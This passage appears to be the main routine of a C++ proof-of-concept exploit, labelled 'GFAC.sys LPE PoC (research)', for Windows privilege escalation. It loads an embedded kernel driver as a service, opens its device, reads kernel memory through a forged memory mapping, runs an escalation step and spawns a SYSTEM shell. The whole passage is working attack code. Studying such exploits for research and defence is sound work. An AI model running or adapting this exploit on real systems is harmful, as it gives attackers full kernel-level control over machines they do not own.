        scm, GFAC_SERVICE, GFAC_SERVICE, SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        sysPath.c_str(), GFAC_LOAD_GROUP, nullptr,
        L"FltMgr\0", nullptr, nullptr);          // lpDependencies = MULTI_SZ {FltMgr}
    if (!svc) {
        printf("[-] CreateService failed gle=%lu\n", GetLastError());
        CloseServiceHandle(scm);
        return false;
    }
    SetupMinifilterRegistry();

    BOOL ok = StartServiceW(svc, 0, nullptr);
    if (!ok) {
        DWORD gle = GetLastError();
        if (gle == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[+] service already running\n");
        } else {
            printf("[-] StartService failed gle=%lu\n", gle);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return false;
        }
    } else {
        printf("[+] driver service started\n");
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return true;
}

static void StopAndRemoveDriver(void) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceW(scm, GFAC_SERVICE, SERVICE_ALL_ACCESS);
    if (svc) {
        SERVICE_STATUS st{};
        ControlService(svc, SERVICE_CONTROL_STOP, &st);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

// Wait until \\.\GFAC becomes openable (or time out).
static HANDLE WaitForGfacDevice(int timeoutMs) {
    for (int waited = 0; waited < timeoutMs; waited += 200) {
        HANDLE h = OpenGfac();
        if (h) return h;
        Sleep(200);
    }
    return nullptr;
}

// ----------------------------------------------------------------------------
int wmain(void) {
    setvbuf(stdout, nullptr, _IONBF, 0);   // unbuffered: keep output if we fault
    (void)&GfacUnmapForgedMdl;             // referenced even when GFAC_KEEP_MAPPINGS=1
    printf("=== GFAC.sys LPE PoC (research) ===\n");

    // Loading a kernel service needs a full (elevated) admin token. A double
    // click on an admin account only gets a *filtered* token, which is why the
    // PoC previously worked from an elevated terminal but not on its own. The
    // embedded manifest now requests requireAdministrator; this is the backstop.
    {
        BOOL elevated = FALSE; HANDLE tok = nullptr;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
            TOKEN_ELEVATION te{}; DWORD sz = sizeof(te);
            if (GetTokenInformation(tok, TokenElevation, &te, sizeof(te), &sz))
                elevated = te.TokenIsElevated;
            CloseHandle(tok);
        }
        wchar_t cwd[MAX_PATH]{};
        GetCurrentDirectoryW(MAX_PATH, cwd);
        printf("[i] elevated=%d cwd=%ls\n", elevated ? 1 : 0, cwd);
        if (!elevated) {
            printf("[-] NOT elevated. Right-click > Run as administrator "
                   "(a plain double-click keeps a filtered token).\n");
            printf("press Enter to exit...\n");
            getchar();
            return 1;
        }
    }

    // --- load the (embedded) driver ----------------------------------------
    EnablePrivilege(L"SeLoadDriverPrivilege");
    std::wstring sysPath = ExtractEmbeddedDriver();
    if (sysPath.empty()) {                       // fall back to a file next to the exe
        wchar_t exe[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe, MAX_PATH);
        std::wstring dir(exe);
        size_t s = dir.find_last_of(L"\\/");
        if (s != std::wstring::npos) {
            sysPath = dir.substr(0, s + 1) + GFAC_SYS_NAME;
            printf("[i] no embedded driver; trying %ls\n", sysPath.c_str());
        }
    }
    bool installed = !sysPath.empty() && InstallAndStartDriver(sysPath);

    HANDLE h = WaitForGfacDevice(installed ? 10000 : 0);
    if (!h) h = OpenGfac();
    if (!h) {
        printf("[-] cannot open %ls (gle=%lu) - load failed / device ACL\n",
               GFAC_DEVICE_SYMLINK, GetLastError());
        if (installed) StopAndRemoveDriver();
        return 1;
    }
    printf("[+] opened \\\\.\\GFAC\n");

    uint32_t ver = 0;
    if (GfacGetVersion(h, &ver)) printf("[+] GFAC interface OK (magic 0x%x)\n", ver);
    else                          printf("[!] version IOCTL unexpected\n");

    // --- primitive demo: read the kernel image header through the mapping ----
    uint64_t kbase = GetNtoskrnlBase(h);
    if (kbase) {
        uint16_t mz = 0;
        if (KRead(h, kbase, &mz, sizeof(mz)))
            printf("[+] KRead(ntoskrnl base 0x%llx) -> 0x%04x (expect 0x5A4D)\n",
                   (unsigned long long)kbase, mz);
        else
            printf("[-] kernel mapping primitive FAILED\n");
    }

    // --- escalate (SEH-guarded so a fault prints instead of dying) ----------
    if (RunEscalation(h)) {
        SpawnSystemShell();
    } else {
        printf("[-] escalation failed (see README)\n");
    }

    CloseHandle(h);
    if (installed) StopAndRemoveDriver();
    printf("press Enter to exit...\n");
    getchar();
    return 0;
}



